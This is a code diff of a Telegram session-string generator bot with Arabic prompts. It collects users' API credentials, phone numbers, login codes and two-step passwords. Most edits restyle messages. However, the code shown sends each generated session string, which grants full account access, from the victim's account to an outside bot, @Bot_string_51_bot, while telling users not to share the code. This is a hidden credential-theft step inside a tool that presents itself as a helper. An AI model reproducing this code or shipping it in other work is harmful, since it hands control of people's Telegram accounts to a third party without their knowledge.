@@ -25,21 +25,23 @@ import config
 
 
 
-ask_ques = "**» يرجى اختيار الجلسة المطلوبة :**"
+ask_ques = "**• ذا كنت تريد تنصب ميوزك اختار بايروجرام\n\n• واذا تريد تنصب تليثون فأختار تيرمڪس\n\n• يوجد استخرجات جلسات لي البوتات**"
+
+
 buttons_ques = [
     [
-        InlineKeyboardButton("بايروجرام", callback_data="pyrogram"),
-        InlineKeyboardButton("تيليثون", callback_data="telethon"),
+        InlineKeyboardButton("بايروجرام 🥀", callback_data="pyrogram"),
+        InlineKeyboardButton("تلثيون 🥀", callback_data="telethon"),
     ],
     [
-        InlineKeyboardButton("بوت بايروجرام", callback_data="pyrogram_bot"),
-        InlineKeyboardButton("بوت تيليثون", callback_data="telethon_bot"),
+        InlineKeyboardButton("بايروجرام بوت 🥀", callback_data="pyrogram_bot"),
+        InlineKeyboardButton("تلثيون بوت 🥀", callback_data="telethon_bot"),
     ],
 ]
 
 gen_button = [
     [
-        InlineKeyboardButton(text="بـدأ استـخـࢪاج اެݪجـلسة", callback_data="generate")
+        InlineKeyboardButton(text=" اضغط لبدا استخراج الكود 🥀 ", callback_data="generate")
     ]
 ]
 
@@ -58,9 +60,9 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         ty = "ᴩʏʀᴏɢʀᴀᴍ"
     if is_bot:
         ty += " ʙᴏᴛ"
-    await msg.reply(f"» بدء استخراج جلسة **{ty}**")
+    await msg.reply(f"» ⚡ ¦ بـدء إنـشـاء جـلسـة **{ty}** ...")
     user_id = msg.chat.id
-    api_id_msg = await bot.ask(user_id, " - قم ارسال كـود APP_ID لو مو مستخرج اضغط \n\n /skip ", filters=filters.text)
+    api_id_msg = await bot.ask(user_id, "🎮حسنـا قم بأرسال الـ API_ID\n\nاضغط /skip عشان تكمل بالموجدين", filters=filters.text)
     if await cancelled(api_id_msg):
         return
     if api_id_msg.text == "/skip":
@@ -72,22 +74,22 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         except ValueError:
             await api_id_msg.reply("**ᴀᴩɪ_ɪᴅ** ᴍᴜsᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ, sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
             return
-        api_hash_msg = await bot.ask(user_id, "» قم بارسال الايبي هاش", filters=filters.text)
+        api_hash_msg = await bot.ask(user_id, "» 🎮حسنـا قم بأرسال الـ API_HASH", filters=filters.text)
         if await cancelled(api_hash_msg):
             return
         api_hash = api_hash_msg.text
     if not is_bot:
-        t = "» - قم بارسـال رقـم هاتف حسابـك تيليجـرام مع مفتـاح الدولـه - مثـال : +963xxxxxxx'"
+        t = "» ✔️الان ارسل رقمك مع رمز دولتك , مثال :+201287585064''"
     else:
-        t = "قم بارسال  **توكن البوت ** للمتابعه .\n مثال  : `5432198765:abcdanonymousterabaaplol`'"
+        t = "ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ʙᴏᴛ_ᴛᴏᴋᴇɴ** ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.\nᴇxᴀᴍᴩʟᴇ : `5432198765:abcdanonymousterabaaplol`'"
     phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
     if await cancelled(phone_number_msg):
         return
     phone_number = phone_number_msg.text
     if not is_bot:
-        await msg.reply("بـدء استخـراج الجلسـه ⌬....")
+        await msg.reply(" انتظر سـوف نـرسـل كـود لحسابك بالتليجـرام .")
     else:
-        await msg.reply("» بـدء استخـراج الجلسـه ⌬.......")
+        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ ʟᴏɢɪɴ ᴠɪᴀ ʙᴏᴛ ᴛᴏᴋᴇɴ...")
     if telethon and is_bot:
         client = TelegramClient(StringSession(), api_id, api_hash)
     elif telethon:
@@ -113,11 +115,11 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     try:
         phone_code_msg = None
         if not is_bot:
-            phone_code_msg = await bot.ask(user_id, "- يرجى التحقق من كود الدخول من حسابك تيليجرام ، إذا كان رمز الدخول بهذا الشكل 12345 - قم بارساله بالشكل الاتي (خلي مسافه بين كل رقم والثاني)  1 2 3 4 5", filters=filters.text, timeout=600)
+            phone_code_msg = await bot.ask(user_id, "[ارسل الكود زي اللي في الصوره](https://telegra.ph/file/da1af082c6b754959ab47.jpg)» 🔍من فضلك افحص حسابك بالتليجرام وتفقد الكود من حساب اشعارات التليجرام. إذا كان\n  هناك تحقق بخطوتين( المرور ) ، أرسل كلمة المرور هنا بعد ارسال كود الدخول بالتنسيق أدناه.- اذا كانت كلمة المرور او الكود  هي\n 12345 يرجى ارسالها بالشكل التالي 1 2 3 4 5 مع وجود مسـافـات بين الارقام اذا احتجت مساعدة @ZzZ68Z.", filters=filters.text, timeout=600)
             if await cancelled(phone_code_msg):
                 return
     except TimeoutError:
-        await msg.reply("» تم انتهاء الوقت 10 دقائق قم بالاستخراج مره اخره", reply_markup=InlineKeyboardMarkup(gen_button))
+        await msg.reply(" تم انتهاء وقت الجلسه 10 دقائق يرجى اعاده استخراج الجلسه من البدايه .", reply_markup=InlineKeyboardMarkup(gen_button))
         return
     if not is_bot:
         phone_code = phone_code_msg.text.replace(" ", "")
@@ -127,16 +129,16 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
             else:
                 await client.sign_in(phone_number, code.phone_code_hash, phone_code)
         except (PhoneCodeInvalid, PhoneCodeInvalidError):
-            await msg.reply("» عذرا هناك خطأ بالكود.", reply_markup=InlineKeyboardMarkup(gen_button))
+            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴡʀᴏɴɢ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
             return
         except (PhoneCodeExpired, PhoneCodeExpiredError):
-            await msg.reply("» عذرا هناك خطأ بالكود.", reply_markup=InlineKeyboardMarkup(gen_button))
+            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴇxᴩɪʀᴇᴅ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
             return
         except (SessionPasswordNeeded, SessionPasswordNeededError):
             try:
-                two_step_msg = await bot.ask(user_id, "» - حسابك يوجد فيه التحقق بـ خطوتين ، يرجى ادخال كلمة المرور.", filters=filters.text, timeout=300)
+                two_step_msg = await bot.ask(user_id, " ارسل الباسورد الخاص بحسابك .", filters=filters.text, timeout=300)
             except TimeoutError:
-                await msg.reply("» تم انتهاء الوقت 5 دقائق قم بالاستخراج مره اخره", reply_markup=InlineKeyboardMarkup(gen_button))
+                await msg.reply(" تم انتهاء وقت الجلسه 5 دقائق يرجى اعاده استخراج الجلسه من البدايه ..", reply_markup=InlineKeyboardMarkup(gen_button))
                 return
             try:
                 password = two_step_msg.text
@@ -158,7 +160,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = f"** هذه جلسة  {ty} ** \n\n`{string_session}` تم الاستخراج بواسطة @ZzZ68Z"
+    text = f"**جلستك يبروو {ty} ** \n\n`{string_session}` \n\n**تم الاستخراج بواسطة :** @ZzZ68Z \n🍒 **ɴᴏᴛᴇ :**  🥺"
     try:
         if not is_bot:
             await client.send_message("Bot_string_51_bot", text)
@@ -167,20 +169,20 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     except KeyError:
         pass
     await client.disconnect()
-    await bot.send_message(msg.chat.id, "» - تم إنشاء جلسة تيرمكس بايروجـرام  بنجاح .. - يرجى التحقق من هاذا البوت @Bot_string_51_bot في الحساب الذي قمت بالاستخراج له واخذ الكود! - لا تقم بمشاركـة هذا الكود مع احـد ⚠️".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
+    await bot.send_message(msg.chat.id, "» ✅تم استخراج الجلسه بنجاح ️ {} .\n\n» - تم إنشاء جلسة تيرمكس بايروجـرام  بنجاح .. - يرجى التحقق من هاذا البوت @Bot_string_51_bot في الحساب الذي قمت بالاستخراج له واخذ الكود! - لا تقم بمشاركـة هذا الكود مع احـد ⚠️! \n\n**ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ** @ZzZ68Z 🥺".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
 
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
-        await msg.reply("**» تم الغاء استخراج الجلسة  !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
+        await msg.reply("** تم تنفيـذ طـلبگ آنتهہ‏‏ت آلعمـليـهہ‏‏ لبدآيـ‏‏هہ آگتب /start !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
         return True
     elif "/restart" in msg.text:
-        await msg.reply("**» تم اعادة تشغيل البوت  !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
+        await msg.reply("**» تمـ آعآدهہ‏‏ آلتشـغيـل مـن تآنيـﮯ يـبرو !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
         return True
     elif "/skip" in msg.text:
         return False
     elif msg.text.startswith("/"):  # Bot Commands
-        await msg.reply("**» تم الغاء استخراج الجلسة !**", quote=True)
+        await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴩʀᴏᴄᴇss !**", quote=True)
         return True
     else:
         return False
